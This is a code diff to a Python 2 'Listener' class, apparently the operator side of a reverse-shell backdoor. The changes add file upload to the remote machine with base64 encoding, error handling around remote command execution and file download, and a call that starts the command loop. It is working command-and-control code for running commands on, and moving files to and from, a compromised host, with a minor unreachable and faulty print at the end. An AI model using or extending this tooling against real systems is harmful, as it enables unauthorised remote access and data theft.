@@ -64,14 +64,32 @@ class Listener:
             return '[+] Download successful...'
 
 
+    def read_file(self, path):
+        with open(path, 'rb') as file:
+            return base64.b64encode(file.read())        # encodes unknown characters to known characters
+
+
     def run(self):
         while True:
             command = raw_input('>> ')
             command = command.split(' ')
-            result = self.execute_remotely(command)
-            if command[0] == 'download':
-                result = self.write_file(result)
+
+            try:
+                if command[0] == 'upload':
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
+
+                result = self.execute_remotely(command)
+
+                if command[0] == 'download' and '[-] Error' not in result:
+                    result = self.write_file(result)
+            except Exception:
+                result = '[-] Error during command execution.'
+
             print(result)
 
 
 my_listener = Listener(options.local_ip, options.port)
+my_listener.run()
+
+print('Got a connection from: ' + options.ip + ':' + options.port)
